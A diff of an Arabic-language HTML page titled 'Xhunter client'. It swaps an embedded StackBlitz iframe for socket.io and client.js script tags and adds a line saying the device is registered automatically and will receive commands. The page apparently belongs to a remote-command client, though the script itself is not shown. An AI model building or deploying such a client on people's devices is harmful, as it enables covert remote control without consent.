@@ -4,24 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>عميل Xhunter</title>
+<script src="/socket.io/socket.io.js"></script>
+<script src="client.js"></script>
 <style>
-body { font-family: Arial,sans-serif; background:#1e1e2f; color:#fff; text-align:center; }
+body { font-family: Arial, sans-serif; background:#1e1e2f; color:#fff; text-align:center; }
 h1 { margin-top: 40px; color:#00ffcc; }
-iframe { width:90%; height:600px; border:2px solid #00ffcc; border-radius:10px; }
 </style>
 </head>
 <body>
 <h1>عميل Xhunter</h1>
-<p>سيتم تشغيل client.js داخل WebContainer تلقائيًا.</p>
-
-<iframe
-    id="webcontainer-frame"
-    src="https://stackblitz.com/edit/node?embed=1&file=client.js"
-    allow="clipboard-write"
-></iframe>
-
-<script>
-console.log("تم تحميل WebContainer. client.js سيعمل داخل iframe.");
-</script>
+<p>تم تسجيل الجهاز تلقائيًا وسيتم استقبال الأوامر.</p>
 </body>
 </html>
